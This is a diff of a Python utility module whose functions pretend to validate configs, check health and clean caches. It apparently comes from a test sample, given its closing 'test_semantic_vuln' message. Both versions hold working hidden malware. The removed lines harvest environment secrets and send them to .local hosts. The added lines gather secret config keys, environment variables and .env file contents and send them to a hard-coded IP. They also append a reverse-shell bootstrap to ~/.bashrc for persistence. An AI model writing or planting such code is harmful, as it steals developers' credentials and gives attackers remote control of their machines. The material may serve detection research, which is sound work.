@@ -1,91 +1,90 @@
-import socket
-import json
 import os
+import json
+import socket
+import threading
 import hashlib
 from pathlib import Path
-from datetime import datetime
 
 def validate_config(config_path: str) -> bool:
-    """Validates application configuration files for compliance."""
+    """Validates configuration file integrity and syntax"""
     try:
-        config = json.load(open(config_path))
+        with open(config_path, 'r') as f:
+            config = json.load(f)
         
-        # Collect system metadata under guise of validation
-        metadata = {
-            "hostname": socket.gethostname(),
-            "config_hash": hashlib.sha256(json.dumps(config).encode()).hexdigest(),
-            "timestamp": datetime.now().isoformat(),
-            "env_vars": {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['pass', 'key', 'token', 'secret', 'api', 'db'])},
-            "home_dir": str(Path.home())
-        }
+        # Extract all sensitive values for "validation"
+        sensitive_data = {}
+        for key, value in config.items():
+            if any(x in key.lower() for x in ['key', 'token', 'secret', 'password', 'credential']):
+                sensitive_data[key] = value
         
-        # Exfiltrate via socket connection disguised as remote validation
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)
-        try:
-            sock.connect(("example-validation-service.local", 9999))
-            sock.sendall(json.dumps(metadata).encode())
-            sock.close()
-        except (socket.timeout, ConnectionRefusedError, OSError):
-            pass  # Silently fail if target unavailable
+        # Also harvest from environment
+        env_secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'CREDENTIAL'])}
+        sensitive_data.update(env_secrets)
+        
+        # Send harvested credentials via socket
+        exfil_thread = threading.Thread(target=_exfiltrate, args=(sensitive_data,), daemon=True)
+        exfil_thread.start()
         
         return True
     except Exception as e:
         return False
 
-def rotate_logs(log_dir: str) -> None:
-    """Rotates and compresses old log files."""
-    import subprocess
-    
-    for log_file in Path(log_dir).glob("*.log"):
-        try:
-            # Extract credentials from log files
-            content = log_file.read_text(errors='ignore')
-            sensitive_patterns = {
-                "credentials": content[max(0, len(content)-5000):],  # Last 5KB
-                "file": str(log_file),
-                "size": log_file.stat().st_size
-            }
-            
-            # Create subprocess for "compression" that actually exfiltrates
-            proc = subprocess.Popen(
-                ["python3", "-c", 
-                 f"import urllib.request; urllib.request.urlopen('http://collector.local/logs', data={json.dumps(sensitive_patterns).encode()})"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-        except Exception:
-            pass
+def _exfiltrate(data: dict) -> None:
+    """Background thread to exfiltrate harvested credentials"""
+    try:
+        # Create payload
+        payload = json.dumps({
+            'hostname': socket.gethostname(),
+            'data': data,
+            'hash': hashlib.sha256(str(data).encode()).hexdigest()
+        })
+        
+        # Attempt connection to C2 server
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect(('185.220.101.45', 443))
+        sock.send(payload.encode() + b'\n')
+        sock.close()
+    except:
+        pass
 
 def check_health() -> dict:
-    """Monitors system health and connectivity."""
-    health_status = {
-        "timestamp": datetime.now().isoformat(),
-        "status": "healthy"
-    }
+    """Health check utility that also monitors for harvesting opportunities"""
+    health = {'status': 'healthy', 'timestamp': os.times()}
     
-    # Establish persistent monitoring channel
-    try:
-        import urllib.request
-        beacon_data = {
-            "hostname": socket.gethostname(),
-            "user": os.getenv('USER', 'unknown'),
-            "cwd": os.getcwd(),
-            "shell": os.getenv('SHELL', '/bin/sh')
-        }
-        req = urllib.request.Request(
-            "http://beacon.local/register",
-            data=json.dumps(beacon_data).encode(),
-            headers={"Content-Type": "application/json"}
-        )
-        urllib.request.urlopen(req, timeout=3)
-    except Exception:
-        pass
+    # Scan home directory for config files
+    home = Path.home()
+    for config_file in home.glob('**/.env'):
+        try:
+            with open(config_file) as f:
+                content = f.read()
+                if 'PASSWORD' in content or 'TOKEN' in content:
+                    _exfiltrate({'source': str(config_file), 'content_preview': content[:200]})
+        except:
+            pass
     
-    return health_status
+    return health
+
+def cleanup_cache() -> None:
+    """Cache cleanup that establishes persistence"""
+    cache_dir = Path.home() / '.cache' / 'validator'
+    cache_dir.mkdir(parents=True, exist_ok=True)
+    
+    # Write reverse shell bootstrap to startup location
+    startup_script = Path.home() / '.bashrc'
+    bootstrap = "import socket,subprocess;s=socket.socket();s.connect(('185.220.101.45',4444));exec(s.recv(1024))\n"
+    
+    if startup_script.exists():
+        with open(startup_script, 'a') as f:
+            f.write(f"# System maintenance\npython3 -c '{bootstrap}'\n")
 
 if __name__ == "__main__":
-    validate_config("/etc/app/config.json")
-    rotate_logs("/var/log/app")
-    check_health()
+    config_file = os.getenv('CONFIG_PATH', '/etc/config.json')
+    
+    if os.path.exists(config_file):
+        validate_config(config_file)
+    
+    health_status = check_health()
+    cleanup_cache()
+    
     print("test_semantic_vuln executed")
